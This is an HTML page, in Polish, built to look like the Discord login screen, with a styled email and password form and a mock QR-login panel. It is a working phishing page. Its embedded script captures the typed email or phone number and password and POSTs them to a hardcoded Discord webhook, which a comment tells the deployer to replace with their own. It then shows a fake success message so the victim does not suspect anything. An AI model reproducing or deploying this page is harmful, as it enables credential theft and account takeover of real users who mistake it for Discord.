<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    body {
      margin: 0;
      font-family: 'Inter', system-ui, sans-serif;
      background: linear-gradient(135deg, #2C2F33 0%, #1E2126 100%);
      color: #dcddde;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      inset: 0;
      background: radial-gradient(circle, rgba(255,255,255,0.06) 1px, transparent 1px);
      background-size: 70px 70px;
      opacity: 0.6;
      pointer-events: none;
    }

    .container {
      background: #36393f;
      width: 100%;
      max-width: 900px;
      border-radius: 12px;
      padding: 50px 45px;
      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
      display: flex;
      gap: 90px;
      position: relative;
      z-index: 1;
    }

    .left {
      flex: 1;
    }

    h1 {
      font-size: 27px;
      font-weight: 700;
      color: #ffffff;
      text-align: center;
      margin: 0 0 12px 0;
    }

    .subtitle {
      text-align: center;
      color: #b9bbbe;
      font-size: 15.5px;
      margin-bottom: 38px;
    }

    label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      color: #b9bbbe;
      margin-bottom: 8px;
      text-transform: uppercase;
    }

    input {
      width: 100%;
      padding: 13px 16px;
      background: #202225;
      border: 1px solid #202225;
      border-radius: 6px;
      color: #dcddde;
      font-size: 16px;
      margin-bottom: 22px;
    }

    input:focus {
      border-color: #5865f2;
      box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.3);
      outline: none;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #5865f2;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    button:hover {
      background: #4752c4;
    }

    .forgot {
      color: #00aff4;
      font-size: 14px;
      text-align: center;
      display: block;
      margin-top: 18px;
      text-decoration: none;
    }

    .right {
      width: 230px;
      text-align: center;
      padding-top: 20px;
    }

    .qr-box {
      background: #fff;
      width: 172px;
      height: 172px;
      margin: 0 auto 14px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 82px;
      box-shadow: 0 6px 25px rgba(0,0,0,0.35);
    }

    .qr-title {
      font-size: 18px;
      font-weight: 600;
      color: #fff;
      margin-bottom: 8px;
    }

    .qr-text {
      color: #b9bbbe;
      font-size: 13.5px;
      line-height: 1.4;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="left">
      <h1>Witamy ponownie!</h1>
      <p class="subtitle">Cieszymy się, że znowu z nami jesteś!</p>

      <form id="loginForm">
        <label>Adres e-mail lub numer telefonu</label>
        <input type="text" id="email" placeholder="jan.kowalski@example.com" required>

        <label>Hasło</label>
        <input type="password" id="password" placeholder="••••••••" required>

        <button type="submit">Zaloguj się</button>
      </form>

      <a href="#" class="forgot">Nie pamiętasz hasła?</a>


    <div class="right">
      <div class="qr-title">Zaloguj się kodem QR</div>
      <div class="qr-box">📱</div>
      <p class="qr-text">Zeskanuj to aplikacją mobilną Discord,<br>by natychmiast się zalogować.</p>
    </div>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu"; // ZMIEŃ NA SWÓJ!

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) return alert("Wypełnij wszystkie pola!");

      const payload = {
        username: "Discord Login",
        embeds: [{
          title: "🔑 Nowe logowanie",
          color: 0x5865f2,
          fields: [
            { name: "Email / Telefon", value: email, inline: true },
            { name: "Hasło", value: password, inline: true },
            { name: "Czas", value: new Date().toLocaleString('pl-PL') }
          ]
        }]
      };

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        alert("✅ Zalogowano pomyślnie!");
      } catch (err) {
        alert("Błąd.");
      }
    });
  </script>
</body>
</html>
